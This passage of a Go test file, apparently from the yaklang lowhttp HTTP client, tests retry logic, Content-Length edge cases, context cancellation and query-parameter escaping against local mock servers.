			WithVerifyCertificate(false),
			WithRetryWaitTime(100*time.Millisecond),
			WithRetryNotInStatusCode([]int{500, 200}),
			WithRetryInStatusCode([]int{500}),
			WithRetryTimes(10),
		)
		require.NoError(t, err)
		require.Equal(t, count, 6, "server should be called at 6 times")
		require.True(t, strings.Contains(string(rsp.RawPacket), string(flag)), "final response should contain the flag")
	})

	t.Run("retry defer", func(t *testing.T) {
		count := 0
		host, port := utils.DebugMockHTTPEx(func(req []byte) []byte {
			count++
			if count < 3 {
				return []byte("HTTP/1.1 403 Forbidden\r\nServer: nginx\r\n\r\n")
			}
			if count < 6 {
				return []byte("HTTP/1.1 500 Internal Server Error\r\nServer: nginx\r\n\r\n")
			}

			return []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s", len(flag), flag))
		})

		hostport := utils.HostPort(host, port)
		packet := `GET / HTTP/1.1
Host: ` + hostport + `
User-Agent: yaklang-test/1.0

`
		saveCount := 0
		respPtr := ""

		rsp, err := HTTP(WithPacketBytes(
			[]byte(packet)),
			WithTimeout(3*time.Second),
			WithRetryWaitTime(100*time.Millisecond),
			WithRetryNotInStatusCode([]int{500, 200}),
			WithRetryInStatusCode([]int{500}),
			WithRetryTimes(10),
			WithSaveHTTPFlowHandler(func(response *LowhttpResponse) {
				if respPtr == fmt.Sprintf("%p", response) { // 检测重试是否出现相同的指针，避免save的时候出现覆盖操作
					t.Fatal("response pointer should not be the same")
				}
				respPtr = fmt.Sprintf("%p", response)
				saveCount++
			}),
			WithSaveHTTPFlowSync(true),
		)
		require.NoError(t, err)
		require.Equal(t, count, 6, "server should be called at 6 times")
		require.Equal(t, saveCount, 6, "save count should be 6")
		require.True(t, strings.Contains(string(rsp.RawPacket), string(flag)), "final response should contain the flag")
	})
}

func TestHTTP_ContentLengthEdgeAndNegativeCases(t *testing.T) {
	tests := []struct {
		name             string
		contentLength    string
		description      string
		expectedResponse string
	}{
		{
			name:             "negative content-length",
			contentLength:    "-10",
			description:      "negative content-length should return 400",
			expectedResponse: "HTTP/1.1 400 Bad Request",
		},
		{
			name:             "zero content-length",
			contentLength:    "0",
			description:      "zero content-length should return 200",
			expectedResponse: "HTTP/1.1 200 OK",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
				writer.Write([]byte("test response"))
			})

			packet := `POST / HTTP/1.1
Host: ` + utils.HostPort(host, port) + `
Content-Length: ` + tt.contentLength + `
Content-Type: application/json

{"test": "data"}`

			rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithNoFixContentLength(true))

			require.NoError(t, err, "Request with %s should not fail", tt.name)
			require.NotNil(t, rsp, "Response should not be nil")
			require.Contains(t, string(rsp.RawPacket), tt.expectedResponse, "Response should contain expected status: %s", tt.expectedResponse)

			t.Logf("Successfully handled %s", tt.description)
			t.Logf("Expected: %s", tt.expectedResponse)
			t.Logf("Response: %s", string(rsp.RawPacket))
		})
	}
}

// TestLowhttp_HTTP_Cancel 测试读取body时，如果上下文被取消，则应该立刻结束读取
func TestLowhttp_HTTP_Cancel(t *testing.T) {
	host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, r *http.Request) {
		writer.Write([]byte("hello"))
		writer.(http.Flusher).Flush()
		time.Sleep(2 * time.Second)
		writer.Write([]byte("world"))
	})
	utils.WaitConnect(utils.HostPort(host, port), 1)
	ctx := utils.TimeoutContext(500 * time.Millisecond)
	start := time.Now()
	rsp, err := HTTP(WithPacketBytes([]byte(`GET / HTTP/1.1
Host: `+utils.HostPort(host, port)+"\r\n\r\n")), WithContext(ctx))
	if err != nil {
		t.Fatal(err)
	}
	totalTime := time.Since(start)
	require.Less(t, totalTime, 600*time.Millisecond)
	require.Equal(t, "hello", string(rsp.GetBody()))
}

// TestLowhttp_HTTP_WithFixQueryEscape 测试 WithFixQueryEscape 选项
// 默认情况下不转义 query 参数，启用后会转义特殊字符
func TestLowhttp_HTTP_WithFixQueryEscape(t *testing.T) {
	t.Run("default - no query escape", func(t *testing.T) {
		// 记录接收到的原始请求 URI
		var receivedURI string
		host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
			receivedURI = request.RequestURI
			writer.Write([]byte("ok"))
		})

		// 构造带有未转义特殊字符的请求
		packet := `GET /test?name=hello world&data=<script>test</script> HTTP/1.1
Host: ` + utils.HostPort(host, port) + `

`
		rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second))
		require.NoError(t, err, "Request should not fail")
		require.NotNil(t, rsp, "Response should not be nil")

		// 默认情况下，特殊字符不应该被转义
		// 注意：实际发送的请求中，空格会被服务器解析
		t.Logf("Received URI: %s", receivedURI)
		t.Logf("Raw Request:\n%s", string(rsp.RawRequest))

		// 验证原始请求包含未转义的字符
		rawRequest := string(rsp.RawRequest)
		require.Contains(t, rawRequest, "hello world", "space should not be escaped by default")
		require.Contains(t, rawRequest, "<script>", "< should not be escaped by default")
	})

	t.Run("with WithFixQueryEscape(true) - query escaped", func(t *testing.T) {
		// 记录接收到的原始请求 URI
		var receivedURI string
		host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
			receivedURI = request.RequestURI
			writer.Write([]byte("ok"))
		})

		// 构造带有未转义特殊字符的请求
		packet := `GET /test?name=hello world&data=<script>test</script> HTTP/1.1
Host: ` + utils.HostPort(host, port) + `

`
		// 使用 WithFixQueryEscape(true) 启用转义
		rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithFixQueryEscape(true))
		require.NoError(t, err, "Request should not fail")
		require.NotNil(t, rsp, "Response should not be nil")

		t.Logf("Received URI: %s", receivedURI)
		t.Logf("Raw Request:\n%s", string(rsp.RawRequest))

		// 验证特殊字符被转义
		rawRequest := string(rsp.RawRequest)
		require.NotContains(t, rawRequest, "hello world", "space should be escaped")
		require.Contains(t, rawRequest, "hello+world", "space should be escaped to +")
		require.NotContains(t, rawRequest, "<script>", "< should be escaped")
		require.Contains(t, rawRequest, "%3Cscript%3E", "< and > should be escaped")
	})

	t.Run("with WithFixQueryEscape(false) - explicitly disabled", func(t *testing.T) {
		// 记录接收到的原始请求 URI
		var receivedURI string
		host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
			receivedURI = request.RequestURI
			writer.Write([]byte("ok"))
		})

		// 构造带有未转义特殊字符的请求
		packet := `GET /test?name=hello world&special=<>&中文 HTTP/1.1
Host: ` + utils.HostPort(host, port) + `

`
		// 显式禁用转义
		rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithFixQueryEscape(false))
		require.NoError(t, err, "Request should not fail")
		require.NotNil(t, rsp, "Response should not be nil")

		t.Logf("Received URI: %s", receivedURI)
		t.Logf("Raw Request:\n%s", string(rsp.RawRequest))

		// 验证特殊字符未被转义
		rawRequest := string(rsp.RawRequest)
		require.Contains(t, rawRequest, "hello world", "space should not be escaped when explicitly disabled")
	})

	t.Run("multiple params with WithFixQueryEscape(true)", func(t *testing.T) {
		// 记录接收到的参数
		var receivedParams map[string][]string
		host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
			receivedParams = request.URL.Query()
			writer.Write([]byte("ok"))
		})

		// 构造多个参数的请求
		packet := `GET /api?tag=go&tag=test&name=hello world&email=test@example.com HTTP/1.1
Host: ` + utils.HostPort(host, port) + `

`
		rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithFixQueryEscape(true))
		require.NoError(t, err, "Request should not fail")
		require.NotNil(t, rsp, "Response should not be nil")

		t.Logf("Received params: %+v", receivedParams)
		t.Logf("Raw Request:\n%s", string(rsp.RawRequest))

		// 验证转义后的请求
		rawRequest := string(rsp.RawRequest)
		require.Contains(t, rawRequest, "tag=go", "first tag should exist")
		require.Contains(t, rawRequest, "tag=test", "second tag should exist")
		require.Contains(t, rawRequest, "hello+world", "space should be escaped")
		require.Contains(t, rawRequest, "test%40example.com", "@ should be escaped to %40")

		// 验证服务器能正确解析参数
		require.NotNil(t, receivedParams, "params should be parsed")
		if receivedParams != nil {
			require.Equal(t, 2, len(receivedParams["tag"]), "should have 2 tag values")
			require.Contains(t, receivedParams["tag"], "go", "should contain 'go' tag")
			require.Contains(t, receivedParams["tag"], "test", "should contain 'test' tag")
			require.Equal(t, "hello world", receivedParams["name"][0], "name param should be correctly decoded")
		}
	})
}
